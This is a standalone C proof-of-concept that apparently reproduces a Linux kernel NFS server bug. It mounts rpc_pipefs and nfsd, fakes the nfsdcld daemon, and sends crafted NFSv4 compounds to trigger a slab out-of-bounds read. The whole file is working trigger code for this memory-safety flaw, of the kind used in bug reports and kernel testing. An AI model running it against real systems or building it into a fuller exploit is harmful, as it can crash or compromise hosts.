// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define PIPEFS_DIR	"./pipefs"
#define CLD_PIPE	PIPEFS_DIR "/nfsd/cld"
#define NFSDFS_DIR	"./nfsdfs"
#define IPMAP_CHANNEL	"/proc/net/rpc/auth.unix.ip/channel"

#define OWNERID		"A"
#define OWNERID_LEN	1

enum cld_command {
	Cld_Create, Cld_Remove, Cld_Check, Cld_GraceDone,
	Cld_GraceStart, Cld_GetVersion,
};
#define OFF_VERS	0
#define OFF_CMD		1
#define OFF_STATUS	2
#define OFF_XID		4
#define OFF_U		8
#define MSGBUF		4096

#define OP_EXCHANGE_ID		42
#define OP_CREATE_SESSION	43
#define OP_SEQUENCE		53
#define OP_RECLAIM_COMPLETE	58

#define NFS_PROG		100003
#define NFS_VERS		4
#define NFSPROC4_COMPOUND	1

#define EXCHGID4_FLAG_USE_NON_PNFS	0x00010000

static volatile int daemon_ready;

struct xb { unsigned char *b; size_t n, cap; };

static void xb_raw(struct xb *x, const void *d, size_t n)
{
	if (x->n + n > x->cap) { fprintf(stderr, "[-] xb overflow\n"); exit(1); }
	memcpy(x->b + x->n, d, n);
	x->n += n;
}
static void xb_u32(struct xb *x, uint32_t v)
{
	uint32_t b = htonl(v);
	xb_raw(x, &b, 4);
}
static void xb_u64(struct xb *x, uint64_t v)
{
	xb_u32(x, (uint32_t)(v >> 32));
	xb_u32(x, (uint32_t)v);
}

static void xb_opaque(struct xb *x, const void *d, uint32_t n)
{
	static const unsigned char z[4] = { 0 };
	xb_u32(x, n);
	xb_raw(x, d, n);
	if (n & 3)
		xb_raw(x, z, 4 - (n & 3));
}

struct xr { const unsigned char *b; size_t n, off; int err; };

static uint32_t xr_u32(struct xr *r)
{
	uint32_t v;
	if (r->off + 4 > r->n) { r->err = 1; return 0; }
	memcpy(&v, r->b + r->off, 4);
	r->off += 4;
	return ntohl(v);
}
static const unsigned char *xr_fixed(struct xr *r, size_t n)
{
	const unsigned char *p;
	if (r->off + n > r->n) { r->err = 1; return NULL; }
	p = r->b + r->off;
	r->off += n;
	return p;
}
static void xr_skip_opaque(struct xr *r)
{
	uint32_t n = xr_u32(r);
	if (r->err) return;
	xr_fixed(r, (n + 3) & ~3u);
}

static uint32_t next_xid = 0x11223344;

static int rpc_call(int fd, const unsigned char *args, size_t arglen,
		    unsigned char *rep, size_t repcap, size_t *replen)
{
	unsigned char hdr[512];
	struct xb h = { hdr, 0, sizeof(hdr) };
	uint32_t xid = next_xid++;
	unsigned char mark[4];
	size_t total;
	uint32_t m;
	ssize_t k;

	xb_u32(&h, xid);
	xb_u32(&h, 0);
	xb_u32(&h, 2);
	xb_u32(&h, NFS_PROG);
	xb_u32(&h, NFS_VERS);
	xb_u32(&h, NFSPROC4_COMPOUND);

	xb_u32(&h, 1);
	xb_u32(&h, 24);
	xb_u32(&h, 0);
	xb_opaque(&h, "poc", 3);
	xb_u32(&h, 0);
	xb_u32(&h, 0);
	xb_u32(&h, 0);

	xb_u32(&h, 0);
	xb_u32(&h, 0);

	total = h.n + arglen;
	m = htonl(0x80000000u | (uint32_t)total);
	memcpy(mark, &m, 4);

	if (write(fd, mark, 4) != 4) return -1;
	if (write(fd, hdr, h.n) != (ssize_t)h.n) return -1;
	if (write(fd, args, arglen) != (ssize_t)arglen) return -1;

	*replen = 0;
	for (;;) {
		size_t got = 0, want;
		uint32_t rm;
		int last;

		while (got < 4) {
			k = read(fd, mark + got, 4 - got);
			if (k <= 0) return -1;
			got += (size_t)k;
		}
		memcpy(&rm, mark, 4);
		rm = ntohl(rm);
		last = !!(rm & 0x80000000u);
		want = rm & 0x7fffffffu;
		if (*replen + want > repcap) return -1;

		got = 0;
		while (got < want) {
			k = read(fd, rep + *replen + got, want - got);
			if (k <= 0) return -1;
			got += (size_t)k;
		}
		*replen += want;
		if (last) break;
	}
	return 0;
}

static int compound_reply(const unsigned char *rep, size_t replen,
			  struct xr *r, uint32_t *compound_status)
{
	uint32_t mtype, reply_stat, accept_stat, vlen;

	r->b = rep; r->n = replen; r->off = 0; r->err = 0;

	xr_u32(r);
	mtype = xr_u32(r);
	if (mtype != 1) { fprintf(stderr, "[-] not a REPLY (%u)\n", mtype); return -1; }
	reply_stat = xr_u32(r);
	if (reply_stat != 0) {
		fprintf(stderr, "[-] RPC denied (reply_stat=%u)\n", reply_stat);
		return -1;
	}
	xr_u32(r);
	vlen = xr_u32(r);
	xr_fixed(r, (vlen + 3) & ~3u);
	accept_stat = xr_u32(r);
	if (accept_stat != 0) {
		fprintf(stderr, "[-] RPC not accepted (accept_stat=%u)\n", accept_stat);
		return -1;
	}
	*compound_status = xr_u32(r);
	xr_skip_opaque(r);
	xr_u32(r);
	return r->err ? -1 : 0;
}

static void *cld_daemon(void *arg)
{
	unsigned char buf[MSGBUF], rep[MSGBUF];
	int fd = -1, i;
	ssize_t n;

	(void)arg;
	daemon_ready = 1;

	for (i = 0; i < 200000; i++) {
		fd = open(CLD_PIPE, O_RDWR);
		if (fd >= 0) break;
		usleep(200);
	}
	if (fd < 0) {
		fprintf(stderr, "[-] never saw %s: %s\n", CLD_PIPE, strerror(errno));
		return NULL;
	}
	printf("[+] fake nfsdcld attached to %s\n", CLD_PIPE);

	for (;;) {
		uint8_t cmd;
		uint32_t xid;

		n = read(fd, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN) continue;
			break;
		}
		if (n == 0) continue;

		cmd = buf[OFF_CMD];
		memcpy(&xid, buf + OFF_XID, 4);
		printf("[+] cld upcall cmd=%u len=%zd\n", cmd, n);

		memset(rep, 0, sizeof(rep));
		rep[OFF_VERS] = buf[OFF_VERS];
		rep[OFF_CMD] = cmd;
		memcpy(rep + OFF_XID, &xid, 4);

		if (cmd == Cld_GetVersion)
			rep[OFF_U] = 2;

		if (write(fd, rep, n) < 0)
			fprintf(stderr, "[-] cld downcall: %s\n", strerror(errno));
	}
	return NULL;
}

static int write_file(const char *path, const char *val)
{
	int fd, r;

	fd = open(path, O_WRONLY);
	if (fd < 0) {
		fprintf(stderr, "[-] open %s: %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, val, strlen(val));
	if (r < 0)
		fprintf(stderr, "[-] write %s: %s\n", path, strerror(errno));
	else
		printf("[+] %s <- \"%s\"\n", path, val);
	close(fd);
	return r < 0 ? -1 : 0;
}

int main(void)
{
	pthread_t th;
	char path[256], line[256];
	unsigned char args[2048], rep[65536];
	unsigned char sessionid[16];
	uint64_t clientid;
	uint32_t seqid, status;
	struct xb x;
	struct xr r;
	struct sockaddr_in sa;
	size_t replen;
	int fd, one = 1;

	setvbuf(stdout, NULL, _IONBF, 0);

	mkdir(PIPEFS_DIR, 0755);
	if (mount("rpc_pipefs", PIPEFS_DIR, "rpc_pipefs", 0, NULL) < 0 && errno != EBUSY) {
		fprintf(stderr, "[-] mount rpc_pipefs: %s\n", strerror(errno));
		return 1;
	}
	mkdir(NFSDFS_DIR, 0755);
	if (mount("nfsd", NFSDFS_DIR, "nfsd", 0, NULL) < 0 && errno != EBUSY) {
		fprintf(stderr, "[-] mount nfsd: %s\n", strerror(errno));
		return 1;
	}

	if (pthread_create(&th, NULL, cld_daemon, NULL) != 0) {
		fprintf(stderr, "[-] pthread_create: %s\n", strerror(errno));
		return 1;
	}
	while (!daemon_ready)
		usleep(1000);

	snprintf(line, sizeof(line), "nfsd 127.0.0.1 %ld nfspoc\n",
		 (long)time(NULL) + 7200);
	write_file(IPMAP_CHANNEL, line);

	snprintf(path, sizeof(path), "%s/versions", NFSDFS_DIR);
	write_file(path, "-2 -3 +4\n");

	snprintf(path, sizeof(path), "%s/portlist", NFSDFS_DIR);
	write_file(path, "tcp 2049");

	snprintf(path, sizeof(path), "%s/threads", NFSDFS_DIR);
	if (write_file(path, "1") < 0) {
		fprintf(stderr, "[-] could not start nfsd\n");
		return 1;
	}
	printf("[+] nfsd running\n");

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) { perror("socket"); return 1; }
	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(2049);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("connect 127.0.0.1:2049");
		return 1;
	}
	printf("[+] connected to nfsd on 127.0.0.1:2049\n");

	x.b = args; x.n = 0; x.cap = sizeof(args);
	xb_opaque(&x, "", 0);
	xb_u32(&x, 1);
	xb_u32(&x, 1);
	xb_u32(&x, OP_EXCHANGE_ID);
	xb_raw(&x, "\x01\x02\x03\x04\x05\x06\x07\x08", 8);
	xb_opaque(&x, OWNERID, OWNERID_LEN);
	xb_u32(&x, EXCHGID4_FLAG_USE_NON_PNFS);
	xb_u32(&x, 0);
	xb_u32(&x, 0);

	printf("[*] EXCHANGE_ID, co_ownerid len=%d\n", OWNERID_LEN);
	if (rpc_call(fd, args, x.n, rep, sizeof(rep), &replen) < 0) {
		fprintf(stderr, "[-] EXCHANGE_ID: no reply\n");
		return 1;
	}
	if (compound_reply(rep, replen, &r, &status) < 0) return 1;
	if (status != 0) { fprintf(stderr, "[-] EXCHANGE_ID status=%u\n", status); return 1; }
	xr_u32(&r);
	if (xr_u32(&r) != 0) { fprintf(stderr, "[-] EXCHANGE_ID op failed\n"); return 1; }
	clientid = ((uint64_t)xr_u32(&r) << 32);
	clientid |= xr_u32(&r);
	seqid = xr_u32(&r);
	if (r.err) { fprintf(stderr, "[-] short EXCHANGE_ID reply\n"); return 1; }
	printf("[+] clientid=0x%016llx seqid=%u\n",
	       (unsigned long long)clientid, seqid);

	x.b = args; x.n = 0; x.cap = sizeof(args);
	xb_opaque(&x, "", 0);
	xb_u32(&x, 1);
	xb_u32(&x, 1);
	xb_u32(&x, OP_CREATE_SESSION);
	xb_u64(&x, clientid);
	xb_u32(&x, seqid);
	xb_u32(&x, 0);

	xb_u32(&x, 0);
	xb_u32(&x, 8192);
	xb_u32(&x, 8192);
	xb_u32(&x, 2048);
	xb_u32(&x, 8);
	xb_u32(&x, 1);
	xb_u32(&x, 0);

	xb_u32(&x, 0);
	xb_u32(&x, 8192);
	xb_u32(&x, 8192);
	xb_u32(&x, 0);
	xb_u32(&x, 2);
	xb_u32(&x, 1);
	xb_u32(&x, 0);
	xb_u32(&x, 0x40000000);
	xb_u32(&x, 0);

	printf("[*] CREATE_SESSION\n");
	if (rpc_call(fd, args, x.n, rep, sizeof(rep), &replen) < 0) {
		fprintf(stderr, "[-] CREATE_SESSION: no reply\n");
		return 1;
	}
	if (compound_reply(rep, replen, &r, &status) < 0) return 1;
	if (status != 0) { fprintf(stderr, "[-] CREATE_SESSION status=%u\n", status); return 1; }
	xr_u32(&r);
	if (xr_u32(&r) != 0) { fprintf(stderr, "[-] CREATE_SESSION op failed\n"); return 1; }
	{
		const unsigned char *sid = xr_fixed(&r, 16);
		if (!sid) { fprintf(stderr, "[-] short CREATE_SESSION reply\n"); return 1; }
		memcpy(sessionid, sid, 16);
	}
	printf("[+] session established\n");

	x.b = args; x.n = 0; x.cap = sizeof(args);
	xb_opaque(&x, "", 0);
	xb_u32(&x, 1);
	xb_u32(&x, 2);
	xb_u32(&x, OP_SEQUENCE);
	xb_raw(&x, sessionid, 16);
	xb_u32(&x, 1);
	xb_u32(&x, 0);
	xb_u32(&x, 0);
	xb_u32(&x, 0);
	xb_u32(&x, OP_RECLAIM_COMPLETE);
	xb_u32(&x, 0);

	printf("[*] SEQUENCE + RECLAIM_COMPLETE  -> inc_reclaim_complete()\n");
	if (rpc_call(fd, args, x.n, rep, sizeof(rep), &replen) < 0) {
		fprintf(stderr, "[-] RECLAIM_COMPLETE: no reply\n");
		return 1;
	}
	if (compound_reply(rep, replen, &r, &status) < 0) return 1;
	printf("[+] compound status=%u\n", status);

	printf("[*] done -- expect a KASAN slab-out-of-bounds in "
	       "nfsd4_find_reclaim_client/clientstr_hashval\n");
	sleep(3);
	return 0;
}
